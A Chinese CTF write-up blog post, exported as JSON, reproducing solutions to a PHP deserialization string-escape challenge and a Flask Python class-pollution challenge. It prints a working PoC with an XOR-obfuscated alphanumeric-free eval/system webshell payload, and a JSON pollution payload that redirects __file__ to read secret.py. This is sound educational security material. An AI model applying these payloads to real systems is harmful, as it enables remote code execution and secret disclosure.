{"title":"巅峰极客及DASCTF7月赛复现","uid":"a006d2fe2aa670ca7acf7929091f72ac","slug":"巅峰极客及DASCTF7月赛复现","date":"2023-07-22T15:51:20.000Z","updated":"2023-09-03T13:06:58.000Z","comments":true,"path":"api/articles/巅峰极客及DASCTF7月赛复现.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202309032104861.jpeg","content":"<h1 id=\"巅峰极客\"><a href=\"#巅峰极客\" class=\"headerlink\" title=\"巅峰极客\"></a>巅峰极客</h1><h2 id=\"unserialize\"><a href=\"#unserialize\" class=\"headerlink\" title=\"unserialize\"></a>unserialize</h2><p>复现环境</p>\n<p>访问<a href=\"http://www.zip可获取源码/\">www.zip可获取源码</a></p>\n<p>而后审计源码</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307231113565.png\" alt=\"image-20230723111202585\"></p>\n<p>这里的话是传入了两个参数，然后将其赋值到一个类中，进行了序列化同时用了b函数进行处理，看一下有关类的</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307231115010.png\" alt=\"image-20230723111504927\"></p>\n<p>这里可以看到能执行反序列化的只有<code>pull_it</code>类中的<code>@eval($this-&gt;x)</code>，因此我们需要控制的就是这个<code>x</code>了，然后我们接下来看刚刚的<code>b</code>函数是什么东西</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307231117846.png\" alt=\"image-20230723111752818\"></p>\n<p>可以发现是替换数据的，看到这个，结合反序列化，这里应该是反序列化逃逸了，不过是字符逃逸增加还是减少呢，我们看的是反序列化前的函数</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307231118358.png\" alt=\"image-20230723111855318\"></p>\n<p>这里发现是<code>a</code>函数，因此是反序列化字符串逃逸减少类型的，接下来看一下如何构造，首先给它随便赋值</p>\n<p>给它赋值为1和2，而后可得到数据</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token string double-quoted-string\">\"O:7:\"</span>push_it<span class=\"token string double-quoted-string\">\":2:&#123;s:13:\"</span>\\<span class=\"token number\">000</span>push_it\\<span class=\"token number\">000</span>root<span class=\"token string double-quoted-string\">\";s:1:\"</span><span class=\"token number\">1</span><span class=\"token string double-quoted-string\">\";s:12:\"</span>\\<span class=\"token number\">000</span>push_it\\<span class=\"token number\">000</span>pwd<span class=\"token string double-quoted-string\">\";s:1:\"</span><span class=\"token number\">2</span><span class=\"token string double-quoted-string\">\";&#125;\"</span>\n    <span class=\"token comment\">// \\000这个是private变量序列化后自带的，其实就是个0，但在PHP中会把这认为是4个字母，所以需要改成0</span>\n<span class=\"token string double-quoted-string\">\"O:7:\"</span>push_it<span class=\"token string double-quoted-string\">\":2:&#123;s:13:\"</span><span class=\"token number\">0</span>push_it0root<span class=\"token string double-quoted-string\">\";s:1:\"</span><span class=\"token number\">1</span><span class=\"token string double-quoted-string\">\";s:12:\"</span><span class=\"token number\">0</span>push_it0pwd<span class=\"token string double-quoted-string\">\";s:1:\"</span><span class=\"token number\">2</span><span class=\"token string double-quoted-string\">\";&#125;\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><code>&quot;;s:12:&quot;0push_it0pwd&quot;;s:1:&quot;2</code>这部分共28个字符，所以我们这里构造14个<code>bbbbbb</code>即可实现逃逸，而后因为这里是两个变量，所以我们需要再自定义一个，因为剩下的还有<code>&quot;;</code>，所以我们需要补到变量上去，也就是说<code>pwd</code>开头必须是<code>&quot;;s:6:&quot;quan9i&quot;</code>这种格式(字符串必须用双引号包裹)，而后我们看执行命令的那个，我们这里需要构造无数字字母<code>webshell</code>，在这里我构造好的<code>system(ls)</code>，其异或结果是<code>(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);</code>，而后我们这里先对其进行URL解码，再对其进行序列化后进行URL编码，然后再将之前自定义的变量赋值给<code>pwd</code>即可，构造Poc如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">pull_it</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$x</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xx</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">x</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$xx</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\n\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">x</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token variable\">$preg_match</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'return preg_match(\"/[A-Za-z0-9]+/i\", $this->x);'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$preg_match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token variable\">$preg_match</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"save_waf\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t@<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">x</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\t\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">push_it</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$root</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">private</span> <span class=\"token variable\">$pwd</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$root</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pwd</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">root</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$root</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">pwd</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$pwd</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\t\n\t\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">root</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">pwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\n\t<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">root</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">pwd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h1>Hello, <span class=\"token interpolation\"><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">root</span></span>&lt;/h1>\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t\t<span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;h1>out!&lt;/h1>\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">pull_it</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'(\"%08%02%08%08%05%0d\"^\"%7b%7b%7b%7c%60%60\")(\"%0c%08\"^\"%60%7b\");'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">=</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pop</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'\";s:6:\"quan9i\";'</span><span class=\"token operator\">.</span><span class=\"token variable\">$pop</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>得到<code>&quot;;s:6:&quot;quan9i&quot;;O%3A7%3A%22pull_it%22%3A1%3A%7Bs%3A10%3A%22%00pull_it%00x%22%3Bs%3A31%3A%22%28%22%08%02%08%08%05%0D%22%5E%22%7B%7B%7B%7C%60%60%22%29%28%22%0C%08%22%5E%22%60%7B%22%29%3B%22%3B%7D</code>，此即为<code>pwd</code>变量，接下来进行赋值</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307231754053.png\" alt=\"image-20230723175446982\"></p>\n<p>此时带着Cookie访问login.php</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202307231755009.png\" alt=\"image-20230723175519920\"></p>\n<h1 id=\"DASCTF7月暑假赛\"><a href=\"#DASCTF7月暑假赛\" class=\"headerlink\" title=\"DASCTF7月暑假赛\"></a>DASCTF7月暑假赛</h1><h2 id=\"EzFlask\"><a href=\"#EzFlask\" class=\"headerlink\" title=\"EzFlask\"></a>EzFlask</h2><p>先不看源码，先来讲一下前置知识，这里开始的考察点为Python原型链污染，这里举个例子</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># Recursive merge function</span>\n    <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> src<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> <span class=\"token string\">'__getitem__'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> dst<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span>\n                merge<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n                dst<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v\n        <span class=\"token keyword\">elif</span> <span class=\"token builtin\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">:</span>\n            merge<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            <span class=\"token builtin\">setattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们通过<code>__class__.__base__</code>可以修改父类属性</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> utils <span class=\"token keyword\">import</span> merge\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">father</span><span class=\"token punctuation\">:</span>\n    secret <span class=\"token operator\">=</span> <span class=\"token string\">\"haha\"</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">son_a</span><span class=\"token punctuation\">(</span>father<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">pass</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">son_b</span><span class=\"token punctuation\">(</span>father<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">pass</span>\n\n\ninstance <span class=\"token operator\">=</span> son_b<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npayload <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">\"__class__\"</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token string\">\"__base__\"</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token string\">\"secret\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string\">\"no way\"</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>son_a<span class=\"token punctuation\">.</span>secret<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#haha</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">.</span>secret<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#haha</span>\nmerge<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">,</span> instance<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>son_a<span class=\"token punctuation\">.</span>secret<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#no way</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">.</span>secret<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#no way</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来再看这道题，访问后得源码</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">import</span> <span class=\"token namespace\">uuid</span>\n\nfrom flask <span class=\"token keyword\">import</span> <span class=\"token class-name\">Flask</span><span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> session\nfrom secret <span class=\"token keyword\">import</span> <span class=\"token namespace\">black_list</span>\n<span class=\"token keyword\">import</span> <span class=\"token namespace\">json</span>\n\napp <span class=\"token operator\">=</span> <span class=\"token class-name\">Flask</span><span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span>\napp<span class=\"token punctuation\">.</span>secret_key <span class=\"token operator\">=</span> <span class=\"token function\">str</span><span class=\"token punctuation\">(</span>uuid<span class=\"token punctuation\">.</span><span class=\"token function\">uuid4</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\ndef <span class=\"token function\">check</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token keyword\">for</span> i in black_list<span class=\"token operator\">:</span>\n        <span class=\"token keyword\">if</span> i in data<span class=\"token operator\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token class-name\">False</span>\n    <span class=\"token keyword\">return</span> <span class=\"token class-name\">True</span>\n\ndef <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v in src<span class=\"token punctuation\">.</span><span class=\"token function\">items</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n        <span class=\"token keyword\">if</span> <span class=\"token function\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> '__getitem__'<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n            <span class=\"token keyword\">if</span> dst<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> and <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> dict<span class=\"token operator\">:</span>\n                <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span><span class=\"token operator\">:</span>\n                dst<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v\n        elif <span class=\"token function\">hasattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span> and <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> dict<span class=\"token operator\">:</span>\n            <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">,</span> <span class=\"token function\">getattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token operator\">:</span>\n            <span class=\"token function\">setattr</span><span class=\"token punctuation\">(</span>dst<span class=\"token punctuation\">,</span> k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    def <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n        self<span class=\"token punctuation\">.</span>username <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n        self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\n        pass\n    def <span class=\"token function\">check</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>username <span class=\"token operator\">==</span> data<span class=\"token punctuation\">[</span>'username'<span class=\"token punctuation\">]</span> and self<span class=\"token punctuation\">.</span>password <span class=\"token operator\">==</span> data<span class=\"token punctuation\">[</span>'password'<span class=\"token punctuation\">]</span><span class=\"token operator\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token class-name\">True</span>\n        <span class=\"token keyword\">return</span> <span class=\"token class-name\">False</span>\n\n<span class=\"token class-name\">Users</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token annotation punctuation\">@app.route</span><span class=\"token punctuation\">(</span>'<span class=\"token operator\">/</span>register'<span class=\"token punctuation\">,</span>methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token char\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\ndef <span class=\"token function\">register</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>data<span class=\"token operator\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token operator\">:</span>\n            <span class=\"token keyword\">if</span> not <span class=\"token function\">check</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token string\">\"Register Failed\"</span>\n            data <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span><span class=\"token function\">loads</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token string\">\"username\"</span> not in data or <span class=\"token string\">\"password\"</span> not in data<span class=\"token operator\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token string\">\"Register Failed\"</span>\n            <span class=\"token class-name\">User</span> <span class=\"token operator\">=</span> <span class=\"token function\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">,</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">)</span>\n            <span class=\"token class-name\">Users</span><span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">)</span>\n        except <span class=\"token class-name\">Exception</span><span class=\"token operator\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token string\">\"Register Failed\"</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"Register Success\"</span>\n    <span class=\"token keyword\">else</span><span class=\"token operator\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"Register Failed\"</span>\n\n<span class=\"token annotation punctuation\">@app.route</span><span class=\"token punctuation\">(</span><span class=\"token char\">'/login'</span><span class=\"token punctuation\">,</span>methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token char\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\ndef <span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>data<span class=\"token operator\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token operator\">:</span>\n            data <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span><span class=\"token function\">loads</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token string\">\"username\"</span> not in data or <span class=\"token string\">\"password\"</span> not in data<span class=\"token operator\">:</span>\n                <span class=\"token keyword\">return</span> <span class=\"token string\">\"Login Failed\"</span>\n            <span class=\"token keyword\">for</span> user in <span class=\"token class-name\">Users</span><span class=\"token operator\">:</span>\n                <span class=\"token keyword\">if</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">check</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n                    session<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">]</span>\n                    <span class=\"token keyword\">return</span> <span class=\"token string\">\"Login Success\"</span>\n        except <span class=\"token class-name\">Exception</span><span class=\"token operator\">:</span>\n            <span class=\"token keyword\">return</span> <span class=\"token string\">\"Login Failed\"</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">\"Login Failed\"</span>\n\n<span class=\"token annotation punctuation\">@app.route</span><span class=\"token punctuation\">(</span><span class=\"token char\">'/'</span><span class=\"token punctuation\">,</span>methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token char\">'GET'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\ndef <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">open</span><span class=\"token punctuation\">(</span>__file__<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token operator\">:</span>\n    app<span class=\"token punctuation\">.</span><span class=\"token function\">run</span><span class=\"token punctuation\">(</span>host<span class=\"token operator\">=</span><span class=\"token string\">\"0.0.0.0\"</span><span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span><span class=\"token number\">5010</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>明显的Python原型链污染，接下来进行污染即可</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token string\">\"username\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"password\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"b\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">\"check\"</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token string\">\"__globals__\"</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token string\">\"__file__\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"secret.py\"</span>\n            <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" 